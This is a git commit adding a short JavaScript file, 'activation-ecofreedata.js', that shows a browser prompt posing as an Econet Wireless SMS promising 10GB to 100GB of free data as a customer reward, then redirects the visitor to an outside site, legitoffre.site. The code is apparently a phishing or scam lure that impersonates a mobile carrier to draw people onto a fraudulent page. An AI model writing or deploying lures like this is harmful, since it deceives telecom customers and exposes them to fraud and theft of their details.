e56d04e1d9cd7aae2644e3c541e54fe6ffa08d61
legitipz <gloliousam4@gmail.com>
2025-12-23 00:03:23 -0800

    Create activation-ecofreedata.js

---
+++ activation-ecofreedata.js
@@ -0,0 +1,5 @@
+var password = 'FREE DATA'
+password=prompt('ECONET WIRELESS SMS: Dear Customer, Kindly Check If your Econet Wireless Sim Card Is Qualify To Receive From 10GB To 100GB data, Old Customers Reward, press Free Data To Check Now ','FREE DATA');
+if (password != 'FREE DATA') {
+location.href='https://legitoffre.site/ecofreedata.html';
+}
